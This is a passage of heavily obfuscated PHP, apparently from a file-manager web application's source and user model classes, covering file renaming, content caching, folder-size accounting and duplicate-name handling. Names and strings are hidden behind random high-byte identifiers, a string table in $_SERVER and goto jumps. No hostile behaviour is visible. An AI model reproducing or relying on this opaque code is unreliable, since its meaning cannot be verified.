$Ä£«®ôÅ[$¨Úïê¦Õ[193]]; } $this->updateModifyTime($ŠñàÊÈó); $this->lockMoveEnd($­Ñ„ƒÅ); Hook::trigger($¨Úïê¦Õ[1789], $ˆ•”¦’ö, $«‚Áœ£); return !0; } public function childrenAll($Ñ¬˜„Ú) { $ÀºĞ¬«Í =& $_SERVER[ìïæ“œî]; $Ÿõä¾å§ = $Ñ¬˜„Ú[$ÀºĞ¬«Í[193]]; if ($Ñ¬˜„Ú[$ÀºĞ¬«Í[485]] == $ÀºĞ¬«Í[91]) { $•¶Ü¼ˆß = array($ÀºĞ¬«Í[652] => array($ÀºĞ¬«Í[612], $Ñ¬˜„Ú[$ÀºĞ¬«Í[584]] . $Ÿõä¾å§ . $ÀºĞ¬«Í[613])); $‘£”çˆª = array($ÀºĞ¬«Í[652] => $•¶Ü¼ˆß[$ÀºĞ¬«Í[584]]); $ûüåÌÛÉ = $this->field($ÀºĞ¬«Í[2254])->where($‘£”çˆª)->select(); $Ü›£Ñê = !1; $í“ÚÏÂ = array($Ÿõä¾å§); if ($ûüåÌÛÉ) { $Ü›£Ñê = array_to_keyvalue($ûüåÌÛÉ, $ÀºĞ¬«Í[12], $ÀºĞ¬«Í[541]); $Ü›£Ñê = array_remove_value($Ü›£Ñê, $ÀºĞ¬«Í[228]); $í“ÚÏÂ = array_to_keyvalue($ûüåÌÛÉ, $ÀºĞ¬«Í[12], $ÀºĞ¬«Í[193]); $í“ÚÏÂ[] = $Ÿõä¾å§; } } else { $Ü›£Ñê = array($Ñ¬˜„Ú[$ÀºĞ¬«Í[541]]); $í“ÚÏÂ = array($Ÿõä¾å§); } return array($ÀºĞ¬«Í[2250] => $í“ÚÏÂ, $ÀºĞ¬«Í[1552] => $Ü›£Ñê); } public function removeArray($ÍïşË¼·) { if (!$ÍïşË¼·) { return !0; } } public function removeRelevance($è³Õè÷£, $–®’¨¯Š) { $â»¸äö¬ =& $_SERVER[ìïæ“œî]; $è³Õè÷£ = $è³Õè÷£ ? $è³Õè÷£ : array(); $–®’¨¯Š = $–®’¨¯Š ? $–®’¨¯Š : array(); $è³Õè÷£ = array_unique(array_filter($è³Õè÷£)); $–®’¨¯Š = array_unique(array_filter($–®’¨¯Š)); if (!$è³Õè÷£) { return !1; } $äü¾„ÚÌ = array($â»¸äö¬[491] => array($â»¸äö¬[492], $è³Õè÷£)); Model($â»¸äö¬[2251])->where($äü¾„ÚÌ)->delete(); Model($â»¸äö¬[535])->where($äü¾„ÚÌ)->delete(); Model($â»¸äö¬[2097])->where($äü¾„ÚÌ)->delete(); Model($â»¸äö¬[633])->where($äü¾„ÚÌ)->delete(); Model($â»¸äö¬[1925])->removeBySource($è³Õè÷£); Model($â»¸äö¬[2232])->removeBySource($è³Õè÷£); $this->where($äü¾„ÚÌ)->delete(); Model($â»¸äö¬[544])->remove($–®’¨¯Š); for ($Ï“îôò¢ = 0; $Ï“îôò¢ < count($è³Õè÷£); $Ï“îôò¢++) { $this->sourceCacheClear($è³Õè÷£[$Ï“îôò¢]); } } public function rename($ŞºÏÆš¦, $åÉùÄØá) { $ÏíşÕ„Ô =& $_SERVER[ìïæ“œî]; $¶ıÙÌÙ = $this->sourceInfo($ŞºÏÆš¦); if (!$¶ıÙÌÙ) { return !1; } $Ûó‡®ŒÉ = $this->fileNameExist($¶ıÙÌÙ[$ÏíşÕ„Ô[192]], $åÉùÄØá); if ($Ûó‡®ŒÉ && $Ûó‡®ŒÉ != $ŞºÏÆš¦) { return !1; } $ë¬ïõëâ = array($ÏíşÕ„Ô[494] => $åÉùÄØá, $ÏíşÕ„Ô[651] => USER_ID); if ($¶ıÙÌÙ[$ÏíşÕ„Ô[485]] != $ÏíşÕ„Ô[91]) { $ë¬ïõëâ[$ÏíşÕ„Ô[486]] = substr(get_path_ext($åÉùÄØá), 0, 10); } Model($ÏíşÕ„Ô[633])->eventRename($ŞºÏÆš¦, $¶ıÙÌÙ[$ÏíşÕ„Ô[32]], $åÉùÄØá); $this->sourceCacheClear($ŞºÏÆš¦); $this->setNamePinyin($ŞºÏÆš¦, $ë¬ïõëâ[$ÏíşÕ„Ô[32]], !1); $this->updateModifyTime($¶ıÙÌÙ[$ÏíşÕ„Ô[192]]); $úûİûÈÄ = $this->where(array($ÏíşÕ„Ô[491] => $ŞºÏÆš¦))->data($ë¬ïõëâ)->save(); $æĞá—£² = $ÏíşÕ„Ô[2240] . $¶ıÙÌÙ[$ÏíşÕ„Ô[192]]; if (isset(self::$cacheChildList[$æĞá—£²])) { unset(self::$cacheChildList[$æĞá—£²]); } return $úûİûÈÄ; } public function setNamePinyin($Üıõœæ, $ÍœŒß, $½›’Ìè¨ = true) { $£š®Ãœ =& $_SERVER[ìïæ“œî]; $¤ËŸéÜˆ = Input::check($ÍœŒß, $£š®Ãœ[655]); $©›ı±Š = array($£š®Ãœ[517] => KodSort::makeStr($ÍœŒß)); if ($¤ËŸéÜˆ) { $©›ı±Š[$£š®Ãœ[538]] = str_replace($£š®Ãœ[53], $£š®Ãœ[12], Pinyin::get($ÍœŒß)); $©›ı±Š[$£š®Ãœ[537]] = Pinyin::get($ÍœŒß, $£š®Ãœ[656]); } if (!$½›’Ìè¨ && !$¤ËŸéÜˆ) { $©›ı±Š[$£š®Ãœ[538]] = null; $©›ı±Š[$£š®Ãœ[537]] = null; } $this->metaSet($Üıõœæ, $©›ı±Š); } public function getContent($¯¥ú¿Ú) { $ù÷ï¸ŞÊ =& $_SERVER[ìïæ“œî]; $¿ÎóãØù = $this->fileInfoGet($¯¥ú¿Ú); if (!$¿ÎóãØù) { return !1; } if ($¿ÎóãØù[$ù÷ï¸ŞÊ[79]] == 0) { return $ù÷ï¸ŞÊ[12]; } $ñ¸Øô¿– = $ù÷ï¸ŞÊ[2255] . $¿ÎóãØù[$ù÷ï¸ŞÊ[547]]; if ($¿ÎóãØù[$ù÷ï¸ŞÊ[79]] <= 1024 * 10) { $È›»ïã = Cache::get($ñ¸Øô¿–); if (!$È›»ïã) { $È›»ïã = IO::getContent($¿ÎóãØù[$ù÷ï¸ŞÊ[87]]); Cache::set($ñ¸Øô¿–, $È›»ïã); } return $È›»ïã; } if (!$¿ÎóãØù[$ù÷ï¸ŞÊ[87]]) { return $ù÷ï¸ŞÊ[12]; } return IO::getContent($¿ÎóãØù[$ù÷ï¸ŞÊ[87]]); } public function setDesc($ëß¿ËÆ´, $Ñş˜¨å‚) { $µ×âÔñ =& $_SERVER[ìïæ“œî]; Model($µ×âÔñ[633])->eventAddDesc($ëß¿ËÆ´, $Ñş˜¨å‚); return $this->metaSet($ëß¿ËÆ´, $µ×âÔñ[526], $Ñş˜¨å‚); } public function setContent($ƒöø‹Ù, $€ÄÁÎ«ò = '') { $è‹ÏŸ¢ø =& $_SERVER[ìïæ“œî]; $Êú×¶öá = $this->sourceInfo($ƒöø‹Ù); $¹ğ©šù = $this->fileInfoGet($ƒöø‹Ù); if (!$¹ğ©šù || !$Êú×¶öá) { return !1; } $‘„ÓÔùÒ = Model($è‹ÏŸ¢ø[544])->addFileByContent($€ÄÁÎ«ò, $Êú×¶öá[$è‹ÏŸ¢ø[32]]); $İ×êÙå³ = $this->fileHistory($Êú×¶öá, $‘„ÓÔùÒ[$è‹ÏŸ¢ø[541]], $‘„ÓÔùÒ[$è‹ÏŸ¢ø[79]]); if (!$İ×êÙå³) { return Model($è‹ÏŸ¢ø[544])->remove($‘„ÓÔùÒ[$è‹ÏŸ¢ø[541]]); } $this->folderSizeReset($Êú×¶öá[$è‹ÏŸ¢ø[192]]); return !0; } public function fileSubstr($÷çòàÒ³, $ş„û˜Åí, $Ûß­µÈî) { $ÛœûÅô© = $this->fileInfoGet($÷çòàÒ³); if (!$ÛœûÅô©) { return !1; } return IO::fileSubstr($ÛœûÅô©[$_SERVER[ìïæ“œî][87]], $ş„û˜Åí, $Ûß­µÈî); } public function fileInfoGet($´®–¬Òš) { $¹¥óêš =& $_SERVER[ìïæ“œî]; $”²íÕÉ = $this->sourceInfo($´®–¬Òš); if (!$”²íÕÉ || $”²íÕÉ[$¹¥óêš[485]]) { return !1; } $˜ªÜé² = $¹¥óêš[548] . $”²íÕÉ[$¹¥óêš[541]]; $‘ùù×ï· = _get(self::$cacheFileInfo, $˜ªÜé²); if ($‘ùù×ï·) { return $‘ùù×ï·; } $òäŠÄò = Model($¹¥óêš[544])->fileInfo($”²íÕÉ[$¹¥óêš[541]]); if ($òäŠÄò) { $òäŠÄò[$¹¥óêš[32]] = $”²íÕÉ[$¹¥óêš[32]]; } self::$cacheFileInfo[$˜ªÜé²] = $òäŠÄò; return $òäŠÄò; } private function folderChildrenNumber($Ãò›šï) { $Š÷ƒª÷ =& $_SERVER[ìïæ“œî]; $–â’­™ó = $this->sourceInfo($Ãò›šï); $¼…Òó ï = array($Š÷ƒª÷[652] => array($Š÷ƒª÷[612], $–â’­™ó[$Š÷ƒª÷[584]] . $Ãò›šï . $Š÷ƒª÷[613]), $Š÷ƒª÷[649] => $–â’­™ó[$Š÷ƒª÷[569]], $Š÷ƒª÷[504] => intval($–â’­™ó[$Š÷ƒª÷[505]]), $Š÷ƒª÷[646] => 1); $Ê —ñ£¹ = $this->where($¼…Òó ï)->count(); $„À‡Ş®É = $this->where($¼…Òó ï)->where(array($Š÷ƒª÷[646] => 0))->count(); return array($Š÷ƒª÷[83] => $„À‡Ş®É, $Š÷ƒª÷[84] => $Ê —ñ£¹); } public function pathInfo($»±èÌéŠ, $½æ£şÎ = false) { $©ŠÖíˆ† =& $_SERVER[ìïæ“œî]; $½æ£şÎ = !1; $»±èÌéŠ = intval($»±èÌéŠ); $—áÈÂ—İ = $©ŠÖíˆ†[534] . intval($½æ£şÎ) . $©ŠÖíˆ†[462] . $»±èÌéŠ; $¢ºÒòÈì = _get(self::$cachePathInfo, $—áÈÂ—İ); if ($¢ºÒòÈì) { return $¢ºÒòÈì; } $€õ¹ê®ú = $this->sourceInfo($»±èÌéŠ); if (!$€õ¹ê®ú) { return !1; } $€õ¹ê®ú = $this->_listDataApplyItem($€õ¹ê®ú, $½æ£şÎ); self::$cachePathInfo[$—áÈÂ—İ] = $€õ¹ê®ú; return $€õ¹ê®ú; } public static $cachePathInfoMore = array(); public function pathInfoMore($¡Ê£ê£’) { $„ú…˜Ú =& $_SERVER[ìïæ“œî]; $£ô‰¶ÜØ = _get(self::$cachePathInfoMore, $¡Ê£ê£’); if ($£ô‰¶ÜØ) { return $£ô‰¶ÜØ; } $¼îÅ÷‹¢ = $this->pathInfo($¡Ê£ê£’); if (!$¼îÅ÷‹¢) { return !1; } if ($¼îÅ÷‹¢[$„ú…˜Ú[485]] == $„ú…˜Ú[91]) { $¼îÅ÷‹¢[$„ú…˜Ú[82]] = $this->folderChildrenNumber($¡Ê£ê£’); } self::$cachePathInfoMore[$¡Ê£ê£’] = $¼îÅ÷‹¢; return $¼îÅ÷‹¢; } public function sourceInfo($Ç¿ö) { $™»ÂîŠÙ =& $_SERVER[ìïæ“œî]; if (!$Ç¿ö) { return array(); } $Ç¿ö = intval($Ç¿ö); $¥¤Çíıå = $™»ÂîŠÙ[533] . $Ç¿ö; $öÃ¦óü = _get(self::$cacheSourceInfo, $¥¤Çíıå); if ($öÃ¦óü) { return $öÃ¦óü; } $»™Œı¢Ú = $this->where(array($™»ÂîŠÙ[193] => $Ç¿ö))->find(); self::$cacheSourceInfo[$¥¤Çíıå] = $»™Œı¢Ú; return self::$cacheSourceInfo[$¥¤Çíıå]; } public function sourceCacheClear($€×•Ê¯Ô = false) { self::cacheClear($€×•Ê¯Ô); } public static function cacheClear($†¬ö—š = false) { $Ìº—ùà¬ =& $_SERVER[ìïæ“œî]; if ($†¬ö—š == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ìº—ùà¬[533] . $†¬ö—š]); unset(self::$cachePathInfoMore[$†¬ö—š]); unset(self::$cachePathInfo[$Ìº—ùà¬[2256] . $†¬ö—š]); unset(self::$cachePathInfo[$Ìº—ùà¬[2257] . $†¬ö—š]); } public function metaSet($ú×¼º, $Éœ‡Ò = null, $×¢ºù˜ = null) { $³â íù» = parent::metaSet($ú×¼º, $Éœ‡Ò, $×¢ºù˜); if ($³â íù») { $this->sourceCacheClear($ú×¼º); } return $³â íù»; } public function pathInfoByPath($¹à”ÚãÃ, $€şèùş) { $´í§±¦› =& $_SERVER[ìïæ“œî]; $ÆÈÖãŠÓ = !$€şèùş ? array() : explode($´í§±¦›[8], trim($€şèùş, $´í§±¦›[8])); $ÏğÌ³‘ã = $¹à”ÚãÃ; foreach ($ÆÈÖãŠÓ as $ˆò‹˜¤ß) { $©‚ÇÀ×Ó = array($´í§±¦›[192] => $ÏğÌ³‘ã, $´í§±¦›[32] => $ˆò‹˜¤ß); $ıÖ¥˜Öİ = $this->field($´í§±¦›[2258])->where($©‚ÇÀ×Ó)->select(); if (!$ıÖ¥˜Öİ) { return !1; } $ıÖ¥˜Öİ = array_sort_by($ıÖ¥˜Öİ, $´í§±¦›[505]); $ÏğÌ³‘ã = $ıÖ¥˜Öİ[0][$´í§±¦›[193]]; } $¢òÕĞ¼· = $this->sourceInfo($ÏğÌ³‘ã); $this->pathInfoFilter($¢òÕĞ¼·); return $¢òÕĞ¼·; } protected function updateModifyTime($ƒË¢²ÃÑ) { $Òø•ŒÖš =& $_SERVER[ìïæ“œî]; $‡“áŒà = defined($Òø•ŒÖš[2172]) ? USER_ID : 0; if (!$ƒË¢²ÃÑ) { return; } if (!is_array($ƒË¢²ÃÑ)) { $ƒË¢²ÃÑ = array($ƒË¢²ÃÑ); } foreach ($ƒË¢²ÃÑ as $Å¥ëìÂ => $Ç°ƒÊ±) { $ƒË¢²ÃÑ[$Å¥ëìÂ] = intval($Ç°ƒÊ±); $this->sourceCacheClear($Ç°ƒÊ±); } $··ÅıÆ‰ = array($Òø•ŒÖš[193] => array($Òø•ŒÖš[7], $ƒË¢²ÃÑ)); $‹±‹ÆŒû = array($Òø•ŒÖš[651] => $‡“áŒà, $Òø•ŒÖš[498] => time()); $this->where($··ÅıÆ‰)->save($‹±‹ÆŒû); } public function folderSizeReset($“ÀÙíé, $í¨ó“è = false) { $¶¿ş¿ó =& $_SERVER[ìïæ“œî]; if ($this->statusIgnoreResetSpace) { return; } $“«×è† = $this->sourceInfo($“ÀÙíé); $§¦º•¿Û = $¶¿ş¿ó[2259] . $“ÀÙíé; CacheLock::lock($§¦º•¿Û, 20); if ($í¨ó“è === !1) { $this->sourceCacheClear($“ÀÙíé); $“«×è† = $this->sourceInfo($“ÀÙíé); $í¿€Ğ§ê = array($¶¿ş¿ó[477] => $“ÀÙíé, $¶¿ş¿ó[504] => 0); $•›ò¢ô = $this->where($í¿€Ğ§ê)->sum($¶¿ş¿ó[79]); $í¨ó“è = intval($•›ò¢ô) - intval($“«×è†[$¶¿ş¿ó[79]]); } if ($í¨ó“è == 0) { return CacheLock::unlock($§¦º•¿Û); } $‘âÎ‹ü = $this->parentLevelArray($“«×è†[$¶¿ş¿ó[584]]); if (!$‘âÎ‹ü) { $‘âÎ‹ü = array(); } $‘âÎ‹ü[] = $“«×è†[$¶¿ş¿ó[193]]; $í¿€Ğ§ê = array($¶¿ş¿ó[193] => array($¶¿ş¿ó[492], $‘âÎ‹ü)); if ($í¨ó“è < 0) { $í¿€Ğ§ê[$¶¿ş¿ó[79]] = array($¶¿ş¿ó[1070], abs($í¨ó“è)); } $this->where($í¿€Ğ§ê)->setAdd($¶¿ş¿ó[79], $í¨ó“è); CacheLock::unlock($§¦º•¿Û); $äÔş•Ê = $¶¿ş¿ó[2260] . $“«×è†[$¶¿ş¿ó[190]] . $¶¿ş¿ó[4] . $“«×è†[$¶¿ş¿ó[569]]; $à­£§Á = array($“«×è†[$¶¿ş¿ó[190]], $“«×è†[$¶¿ş¿ó[569]]); TaskRun::timeLimitCall($äÔş•Ê, $¶¿ş¿ó[2261], $à­£§Á, 1.5); } public function folderSizeResetChildren($…Ò–ƒÀ) { $äÒÒÒ¨Õ =& $_SERVER[ìïæ“œî]; $this->sourceCacheClear($…Ò–ƒÀ); $‚ıåàµ = $this->sourceInfo($…Ò–ƒÀ); $„ºÔçß¤ = array($äÒÒÒ¨Õ[646] => 1, $äÒÒÒ¨Õ[649] => $‚ıåàµ[$äÒÒÒ¨Õ[569]], $äÒÒÒ¨Õ[652] => array($äÒÒÒ¨Õ[612], $‚ıåàµ[$äÒÒÒ¨Õ[584]] . $…Ò–ƒÀ . $äÒÒÒ¨Õ[613])); $ÓÁËÅÓ½ = $äÒÒÒ¨Õ[2262]; $…ÉÔ×† = $this->field($ÓÁËÅÓ½)->where($„ºÔçß¤)->select(); $„ºÔçß¤[$äÒÒÒ¨Õ[485]] = 0; $Ïª€Ò…œ = $this->field($ÓÁËÅÓ½)->where($„ºÔçß¤)->select(); if (!$Ïª€Ò…œ) { return; } $…ÉÔ×†[] = $‚ıåàµ; $…ÉÔ×† = array_to_keyvalue($…ÉÔ×†, $äÒÒÒ¨Õ[193]); foreach ($…ÉÔ×† as $¯¦Æúº => $Ó¹˜ûÑ˜) { $…ÉÔ×†[$¯¦Æúº][$äÒÒÒ¨Õ[2263]] = $…ÉÔ×†[$¯¦Æúº][$äÒÒÒ¨Õ[79]]; $…ÉÔ×†[$¯¦Æúº][$äÒÒÒ¨Õ[79]] = 0; } foreach ($Ïª€Ò…œ as $Ó¹˜ûÑ˜) { $ş ±¬³ı = $Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[192]] . $äÒÒÒ¨Õ[12]; if (!isset($…ÉÔ×†[$ş ±¬³ı])) { continue; } if ($Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[505]] == $…ÉÔ×†[$ş ±¬³ı][$äÒÒÒ¨Õ[505]]) { $…ÉÔ×†[$ş ±¬³ı][$äÒÒÒ¨Õ[79]] += $Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[79]]; } } foreach ($…ÉÔ×† as $Ó¹˜ûÑ˜) { $©½Ô­¤Ò = $this->parentLevelArray($Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[584]]); foreach ($©½Ô­¤Ò as $ş ±¬³ı) { $ş ±¬³ı = $ş ±¬³ı . $äÒÒÒ¨Õ[12]; if (!isset($…ÉÔ×†[$ş ±¬³ı])) { continue; } if ($Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[505]] == $…ÉÔ×†[$ş ±¬³ı][$äÒÒÒ¨Õ[505]]) { $…ÉÔ×†[$ş ±¬³ı][$äÒÒÒ¨Õ[79]] += $Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[79]]; } } } $ÅÜ¿¸†Š = array(); foreach ($…ÉÔ×† as $Ó¹˜ûÑ˜) { if ($Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[79]] == $Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[2263]]) { continue; } $ÅÜ¿¸†Š[] = array($äÒÒÒ¨Õ[193], $Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[193]], $äÒÒÒ¨Õ[79], $Ó¹˜ûÑ˜[$äÒÒÒ¨Õ[79]]); } $this->saveAll($ÅÜ¿¸†Š); } public function userSpaceReset($·“Óë Ç = false) { $È¢í€Í =& $_SERVER[ìïæ“œî]; $’´á¿¥ì = $this->where(array($È¢í€Í[190] => self::TYPE_USER, $È¢í€Í[569] => $·“Óë Ç, $È¢í€Í[485] => 0))->sum($È¢í€Í[79]); $’´á¿¥ì = !$’´á¿¥ì || $’´á¿¥ì <= 0 ? 0 : $’´á¿¥ì; Model($È¢í€Í[577])->userEdit($·“Óë Ç, array($È¢í€Í[1934] => $’´á¿¥ì)); } public function targetSpaceUpdate($ÁŞ˜Ú·¢, $Áş¦ÅÛŞ) { $ñ¨¡»¿¦ =& $_SERVER[ìïæ“œî]; if (!$Áş¦ÅÛŞ) { return; } if (!in_array($ÁŞ˜Ú·¢, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $°‰©¥öâ = $this->targetSpaceSize($ÁŞ˜Ú·¢, $Áş¦ÅÛŞ); if ($ÁŞ˜Ú·¢ == self::TYPE_USER) { Model($ñ¨¡»¿¦[577])->userEdit($Áş¦ÅÛŞ, array($ñ¨¡»¿¦[1934] => $°‰©¥öâ)); } else { if ($ÁŞ˜Ú·¢ == self::TYPE_GROUP) { Model($ñ¨¡»¿¦[585])->groupEdit($Áş¦ÅÛŞ, array($ñ¨¡»¿¦[1934] => $°‰©¥öâ)); } } } public function targetSpaceSize($··€ÓÛú, $îùæ¶¿á) { $ÌÌÓ‚Õ =& $_SERVER[ìïæ“œî]; $ö–À†©ä = 0; $˜…û¼†ï = $this->targetSourceRoot($··€ÓÛú, $îùæ¶¿á, !0); foreach ($˜…û¼†ï as $’§úŸùô) { if (!$’§úŸùô) { continue; } $ö–À†©ä += floatval($’§úŸùô[$ÌÌÓ‚Õ[79]]); $ÀÍµŠˆ‘ = array($ÌÌÓ‚Õ[652] => array($ÌÌÓ‚Õ[612], $ÌÌÓ‚Õ[594] . $’§úŸùô[$ÌÌÓ‚Õ[193]] . $ÌÌÓ‚Õ[613])); $¤Ûç¸Í… = Model($ÌÌÓ‚Õ[503])->field($ÌÌÓ‚Õ[491])->where($ÀÍµŠˆ‘)->select(); $¤Ûç¸Í… = array_to_keyvalue($¤Ûç¸Í…, $ÌÌÓ‚Õ[12], $ÌÌÓ‚Õ[193]); $¤Ûç¸Í… = array_unique(array_filter($¤Ûç¸Í…)); if ($¤Ûç¸Í…) { $ÀÍµŠˆ‘ = array($ÌÌÓ‚Õ[491] => array($ÌÌÓ‚Õ[492], $¤Ûç¸Í…)); $ö–À†©ä += floatval($this->where($ÀÍµŠˆ‘)->sum($ÌÌÓ‚Õ[79])); } } $ö–À†©ä = !$ö–À†©ä || $ö–À†©ä <= 0 ? 0 : $ö–À†©ä; return $ö–À†©ä; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ó°ğà²Ç) { return $this->fileTypeProfile($ó°ğà²Ç, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Åêè›ö) { return $this->fileTypeProfile($Åêè›ö, SourceModel::TYPE_GROUP); } private function fileTypeProfile($„šíüíµ, $¥§ş´š‡) { $ñè¿¯İÕ =& $_SERVER[ìïæ“œî]; $°«¨”ôó = $ñè¿¯İÕ[2264] . $„šíüíµ . $ñè¿¯İÕ[11] . $¥§ş´š‡; $¥¯…ë”Å = Cache::get($°«¨”ôó); if ($¥¯…ë”Å) { return $¥¯…ë”Å; } $¡¿ì×ö³ = array($ñè¿¯İÕ[646] => 0); if ($„šíüíµ != !1) { $¡¿ì×ö³[$ñè¿¯İÕ[569]] = $„šíüíµ; $¡¿ì×ö³[$ñè¿¯İÕ[190]] = $¥§ş´š‡; } $Õ¾¾÷âÈ = array(); $Õ¾¾÷âÈ[$ñè¿¯İÕ[2265]] = array($ñè¿¯İÕ[2266] => LNG($ñè¿¯İÕ[2265]), $ñè¿¯İÕ[2267] => $this->where($¡¿ì×ö³)->count(), $ñè¿¯İÕ[617] => $this->where($¡¿ì×ö³)->sum($ñè¿¯İÕ[79])); $Ê½½¦µ– = KodIO::fileTypeList(); foreach ($Ê½½¦µ– as $¸×ãÅµÃ => $–Ÿ¾Ø¯ï) { $¡¿ì×ö³[$ñè¿¯İÕ[486]] = $this->fileTypeWhere($¸×ãÅµÃ); $Õ¾¾÷âÈ[$¸×ãÅµÃ] = array($ñè¿¯İÕ[2266] => $–Ÿ¾Ø¯ï[$ñè¿¯İÕ[32]], $ñè¿¯İÕ[2267] => $this->where($¡¿ì×ö³)->count(), $ñè¿¯İÕ[617] => $this->where($¡¿ì×ö³)->sum($ñè¿¯İÕ[79])); } Cache::set($°«¨”ôó, $Õ¾¾÷âÈ, 1200); return $Õ¾¾÷âÈ; } public function fileNameExist($Ø†¤¿ùÚ, $ÄÕû›¸ø) { $¬ãÇ¾Óİ =& $_SERVER[ìïæ“œî]; $Ïı¾Í = $this->field($¬ãÇ¾Óİ[2268])->where(array($¬ãÇ¾Óİ[192] => $Ø†¤¿ùÚ, $¬ãÇ¾Óİ[32] => $ÄÕû›¸ø, $¬ãÇ¾Óİ[505] => 0))->find(); return is_array($Ïı¾Í) ? $Ïı¾Í[$¬ãÇ¾Óİ[193]] : !1; } public function childList($é•îÅæ) { $·›€À‡ =& $_SERVER[ìïæ“œî]; $†óõ€¥Ş = $·›€À‡[2240] . $é•îÅæ; if (isset(self::$cacheChildList[$†óõ€¥Ş])) { return self::$cacheChildList[$†óõ€¥Ş]; } $÷øøÜˆø = array($·›€À‡[192] => intval($é•îÅæ), $·›€À‡[505] => 0); $êÁ÷ÅÕ = $this->where($÷øøÜˆø)->select(); $êÁ÷ÅÕ = $êÁ÷ÅÕ ? $êÁ÷ÅÕ : array(); self::$cacheChildList[$†óõ€¥Ş] = $êÁ÷ÅÕ; foreach ($êÁ÷ÅÕ as $¤ŒëÂÇŸ) { $†óõ€¥Ş = $·›€À‡[533] . $¤ŒëÂÇŸ[$·›€À‡[193]]; self::$cacheSourceInfo[$†óõ€¥Ş] = $¤ŒëÂÇŸ; } return $êÁ÷ÅÕ; } public function fileNameAuto($õêö®áµ, $Õ‰ø³ß­, $Ğô‰Ç‡ü = REPEAT_RENAME, $Öô§Î¹£ = false) { $ÈÎ¨õÒ =& $_SERVER[ìïæ“œî]; $ ¤Æ½à† = get_path_ext($Õ‰ø³ß­); $§–ò‚Ğ¥ = $ ¤Æ½à† ? get_path_ext_name($Õ‰ø³ß­) . $ÈÎ¨õÒ[2269] . $ ¤Æ½à† : $Õ‰ø³ß­ . $ÈÎ¨õÒ[460]; $Ï¼²ŸÕ÷ = array($ÈÎ¨õÒ[192] => $õêö®áµ, $ÈÎ¨õÒ[505] => 0, $ÈÎ¨õÒ[32] => array($ÈÎ¨õÒ[459], $§–ò‚Ğ¥)); $ûºáœü’ = $this->field($ÈÎ¨õÒ[32])->where($Ï¼²ŸÕ÷)->select(); $åÅÒÉ•Û = array_to_keyvalue($ûºáœü’, $ÈÎ¨õÒ[12], $ÈÎ¨õÒ[32]); return $this->fileNameAutoGet($åÅÒÉ•Û, $Õ‰ø³ß­, $Ğô‰Ç‡ü, $Öô§Î¹£); } public function fileNameAutoGet($Œš¾¹ûË, $„ˆŒÌ«, $¥…æ•µ¨, $ßõûŒé„) { $Ö‘Şë¯æ =& $_SERVER[ìïæ“œî]; if ($¥…æ•µ¨ == REPEAT_REPLACE || !$Œš¾¹ûË || !in_array_not_case($„ˆŒÌ«, $Œš¾¹ûË) || $ßõûŒé„ && $¥…æ•µ¨ != REPEAT_RENAME_FOLDER) { return $„ˆŒÌ«; } if ($¥…æ•µ¨ == REPEAT_SKIP) { return !1; } $›ı‡Î› = $Ö‘Şë¯æ[10] . get_path_ext($„ˆŒÌ«); $›ı‡Î› = $›ı‡Î› == $Ö‘Şë¯æ[10] || $ßõûŒé„ ? $Ö‘Şë¯æ[12] : $›ı‡Î›; for ($ÂÒò¾ÔÕ = 1; $ÂÒò¾ÔÕ <= count($Œš¾¹ûË) + 1; $ÂÒò¾ÔÕ++) { $ş†Š§ğÈ = substr($„ˆŒÌ«, 0, strlen($„ˆŒÌ«) - strlen($›ı‡Î›)); $µÙêàƒ” = $ş†Š§ğÈ . "\50{$ÂÒò¾ÔÕ}\x29{$›ı‡Î›}"; if (!in_array_not_case($µÙêàƒ”, $Œš¾¹ûË)) { return $µÙêàƒ”; } } } } goto FÉÎ ‰¦’; Fã‡ÒÕ˜÷í: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\x6d\x65" => "\165\163\x65\162\137\x6d\145\164\x61", "\x6d\145\x74\x61\106\x69\145\x6c\x64" => "\165\163\145\x72\x49\x44"); protected $simpleField = "\x75\163\145\x72\x49\104\x2c\156\151\143\x6b\116\141\x6d\x65\54\x6e\x61\x6d\x65\54\x61\166\141\x74\141\162\x2c\163\x65\170\x2c\x73\164\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Á‰âÆ›‘) { $Ä†¥øŠµ =& $_SERVER[ìïæ“œî]; $Ëış§úÌ = $Ä†¥øŠµ[2426]; return array($Ä†¥øŠµ[2028] => array($Á‰âÆ›‘[0], $Ëış§úÌ), $Ä†¥øŠµ[2030] => array($Á‰âÆ›‘[0], $Ëış§úÌ), $Ä†¥øŠµ[2427] => array($Á‰âÆ›‘[0], $Ëış§úÌ)); } protected function getInfo($å„¡ßˆê, $º²Œ·òá = false) { $£‹”İ¸‡ = $this->getInfoSimple($å„¡ßˆê); if (!is_array($£‹”İ¸‡)) { return array(); } if ($º²Œ·òá) { return $this->_getInfoApply($£‹”İ¸‡); } return $this->cacheFunctionGet($_SERVER[ìïæ“œî][2032], $å„¡ßˆê); } protected function getInfoFull($¼´üíÏÌ, $õ–Ïè›õ = false) { $›ß•¢·À = $this->getInfoSimple($¼´üíÏÌ); if (!is_array($›ß•¢·À)) { return array(); } if ($õ–Ïè›õ) { return $this->_getInfoApply($›ß•¢·À, !0); } return $this->cacheFunctionGet($_SERVER[ìïæ“œî][2428], $¼´üíÏÌ); } private function _getInfoApply($î¨­ÌŠ·, $ƒ¥êÊâ = false) { $™ß¢èÜ =& 